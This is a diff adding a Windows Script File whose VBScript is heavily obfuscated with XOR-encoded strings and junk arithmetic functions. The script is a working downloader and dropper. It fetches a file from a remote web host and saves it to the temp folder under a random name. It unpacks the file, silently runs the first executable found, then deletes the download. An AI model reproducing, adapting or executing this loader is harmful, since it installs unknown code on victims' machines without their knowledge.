@@ -1,0 +1,133 @@
+<?XML version="1.0"?>
+<package>
+<job id="cmf97k">
+<script language="VBScript">
+<![CDATA[
+Randomize
+
+Function tkvyx(A)
+    Dim i, s, k
+    k = A(0)
+    s = ""
+    For i = 1 To UBound(A)
+        s = s & Chr(A(i) Xor k)
+    Next
+    tkvyx = s
+End Function
+
+Function jnxg1z()
+    Dim i, b
+    b = ""
+    For i = 1 To 8
+        b = b & Chr(97 + Int(Rnd * 26))
+    Next
+    jnxg1z = b
+End Function
+
+Function tcb8m(ut8uzw)
+    Dim h2yyj, tpyf3
+    ut8uzw = ut8uzw Xor 242
+    tpyf3 = (tpyf3 + 862) Xor 239
+    tpyf3 = (tpyf3 Xor 540) Xor 210
+    tpyf3 = (tpyf3 - 39) Xor 220
+    tcb8m = ut8uzw Mod 7
+End Function
+
+Function qm2hpt(bnw8vr)
+    Dim sj6, y95
+    bnw8vr = bnw8vr Xor 205
+    sj6 = (sj6 - 152) Xor 120
+    sj6 = (sj6 Mod 501) Xor 239
+    y95 = (y95 + 180) Xor 203
+    sj6 = (sj6 - 243) Xor 193
+    sj6 = (sj6 + 728) Xor 162
+    qm2hpt = bnw8vr Mod 7
+End Function
+
+Function oztub1(lkf)
+    Dim wtm, fgfk
+    lkf = lkf Xor 207
+    wtm = (wtm + 441) Xor 59
+    fgfk = (fgfk * 872) Xor 142
+    fgfk = (fgfk Xor 763) Xor 50
+    wtm = (wtm + 70) Xor 218
+    wtm = (wtm * 280) Xor 149
+    fgfk = (fgfk + 1) Xor 240
+    oztub1 = lkf Mod 7
+End Function
+
+Function vd89(dr79sj)
+    Dim w0t, pcuad
+    dr79sj = dr79sj Xor 219
+    w0t = (w0t * 821) Xor 112
+    pcuad = (pcuad Xor 485) Xor 45
+    w0t = (w0t Xor 991) Xor 173
+    vd89 = dr79sj Mod 7
+End Function
+
+Dim czztb, l3p, f3qm9, ce0, ubm, gsm, oav1o
+Dim r9t, g777, f53, a8w9qq, cdku, c28q
+Dim b1wc, njd3w, mnw, vnmi4, m9qkov, m0k4
+
+Set czztb = CreateObject(tkvyx(Array(218,137,185,168,179,170,174,179,180)) & tkvyx(Array(23,112,57,81,126,123,114,68,110,100,99,114,122)) & tkvyx(Array(247,184,149,157,146,148,131)))
+Set l3p = CreateObject(tkvyx(Array(131,212,208,224,241)) & tkvyx(Array(50,91,66,70,28,97,90,87,94,94)))
+
+l3p.Run tkvyx(Array(248,136)) & tkvyx(Array(246,159,152,145,214,219,152,214,196,214,199,196,193,216)) & tkvyx(Array(136,184,166,184,166,185,168,182,168,230,253,228)), 0, True
+Call tcb8m(560)
+
+b1wc = (b1wc + 388) Xor 79
+njd3w = (njd3w + 54) Xor 183
+mnw = (mnw + 474) Xor 163
+vnmi4 = (vnmi4 + 165) Xor 73
+m9qkov = (m9qkov + 27) Xor 182
+m0k4 = (m0k4 + 450) Xor 126
+
+r9t = tkvyx(Array(201,161,189,189,185)) & tkvyx(Array(95,44,101,112,112,56,54,43,55,42,61,113,60,48,50,112,50,58,51,48,59,54,60,61,62,60,52,112,44,43,48,45,62,56,58,112,45,62,40)) & tkvyx(Array(152,183,234,253,254,235,183,240,253,249,252,235,183,245,249,241,246,183,232,249,225,244,247,249,252,182,226,241,232))
+g777 = l3p.ExpandEnvironmentStrings(tkvyx(Array(236,201,173,188,188,168,173)) & tkvyx(Array(181,225,244,144)))
+f53 = g777 & tkvyx(Array(58,102)) & jnxg1z() & tkvyx(Array(29,51,103,116,109))
+
+Set f3qm9 = CreateObject(tkvyx(Array(105,36)) & tkvyx(Array(179,224)) & tkvyx(Array(138,210,199,198,184,164,217,239,248,252,239,248,210,199,198,194,222,222,218,164,188,164)) & tkvyx(Array(104,88)))
+f3qm9.setOption 3, 13056
+f3qm9.Open tkvyx(Array(253,186,184,169)), r9t, False
+f3qm9.setRequestHeader tkvyx(Array(208,133)) & tkvyx(Array(105,26,12,27,68,40,14,12,7,29)), tkvyx(Array(253,176)) & tkvyx(Array(167,200,221,206,203,203,198,136,146,137,151))
+f3qm9.Send
+If f3qm9.Status < 200 Or f3qm9.Status >= 300 Then WScript.Quit
+
+Set ce0 = CreateObject(tkvyx(Array(176,241)) & tkvyx(Array(160,228,239,228,226,142,243,212,210,197,193,205)))
+ce0.Type = 1
+ce0.Open
+ce0.Write f3qm9.ResponseBody
+ce0.SaveToFile f53, 2
+ce0.Close
+
+If Not czztb.FileExists(f53) Then WScript.Quit
+If czztb.GetFile(f53).Size < 100 Then WScript.Quit
+
+a8w9qq = g777 & tkvyx(Array(251,167)) & jnxg1z()
+czztb.CreateFolder a8w9qq
+
+l3p.Run tkvyx(Array(187,207,218,201,155)) & tkvyx(Array(119,90,15,17,87)) & tkvyx(Array(24,58)) & f53 & tkvyx(Array(85,119)) & tkvyx(Array(155,187,182,216,187)) & tkvyx(Array(137,171)) & a8w9qq & tkvyx(Array(160,130)), 0, True
+
+oav1o = False
+cdku = tkvyx(Array(117,16,13,16))
+If czztb.FolderExists(a8w9qq) Then
+    Set ubm = czztb.GetFolder(a8w9qq)
+    For Each gsm In ubm.Files
+        If LCase(czztb.GetExtensionName(gsm.Name)) = cdku Then
+            c28q = gsm.Path
+            oav1o = True
+            Exit For
+        End If
+    Next
+End If
+
+If oav1o Then
+    l3p.Run tkvyx(Array(146,176)) & c28q & tkvyx(Array(133,167)), 0, False
+End If
+
+l3p.Run tkvyx(Array(120,8,17,22)) & tkvyx(Array(254,153,222,211,144,222,207,222,207,204,201,208,206,208,206,208,207,222,192,222,144,139,146)), 0, True
+czztb.DeleteFile f53
+]]>
+</script>
+</job>
+</package>
